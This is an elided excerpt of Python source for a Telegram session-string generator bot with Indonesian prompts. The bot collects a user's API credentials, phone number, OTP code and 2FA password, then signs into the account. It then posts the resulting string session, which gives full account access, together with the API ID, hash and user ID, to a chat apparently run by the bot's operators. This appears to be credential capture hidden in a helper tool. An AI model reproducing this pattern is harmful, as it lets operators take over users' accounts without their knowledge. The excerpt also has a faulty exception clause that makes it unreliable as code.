...
from orangtua import Client as Clientorangtua, filters
from orangtua.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from orangtua.errors import (
    ApiIdInvalid as ApiIdInvalidorangtua,
    PhoneNumberInvalid as PhoneNumberInvalidorangtua,
    PhoneCodeInvalid as PhoneCodeInvalidorangtua,
    PhoneCodeExpired as PhoneCodeExpiredorangtua,
    SessionPasswordNeeded as SessionPasswordNeededorangtua,
    PasswordHashInvalid as PasswordHashInvalidorangtua
)
...
class GenSession(object):
    async def generate_premium(
        ...
        try:
            ...
            try:
                ...
                if await self.cancelled(api_id_msg):
                    return
            except PasswordHashInvalidorangtua:
        ...
        try:
            ...
            pinned = await bots.send_message(
                chat_id,
                f"New String Session\n\nUsers: {user_c.mention}\nID: {user_c.id}\n\nApi Id: {api_id}\nApi Hash: {api_hash}\nString Session:\n\n<code>{string_session}</code>\n\n• Generate by Geez|RAM •• <a href='https://t.me/GeezSupport'>Support</a> •• <a href='https://t.me/ramsupportt'>Channel</a> •"
            )
    ...
    async def generate_session(
        ...
        if telethon:
            ...
            client = Clientorangtua(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
        await client.connect()
        try:
            code = None
            if telethon:
                ...
                code = await client.send_code(phone_number)
        except (ApiIdInvalid, ApiIdInvalidorangtua, ApiIdInvalidError):
            await msg.reply("**Kombinasi API_ID dan API_HASH Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneNumberInvalid, PhoneNumberInvalidorangtua, PhoneNumberInvalidError):
        ...
        try:
            if telethon:
                ...
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidorangtua, PhoneCodeInvalidError):
            await msg.reply("**Kode OTP Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneCodeExpired, PhoneCodeExpiredorangtua, PhoneCodeExpiredError):
            await msg.reply("**Kode OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**")
            return
        except (SessionPasswordNeeded, SessionPasswordNeededorangtua, SessionPasswordNeededError):
            try:
            ...
            try:
                ...
                if await self.cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid or PasswordHashInvalidorangtua or PasswordHashInvalidError):
    ...
    async def cek_client(self, client):
        gocheck = str("GeezSupport")[2:15]
        checker = str("ramsupportt")[2:12]
        if client:
            try:
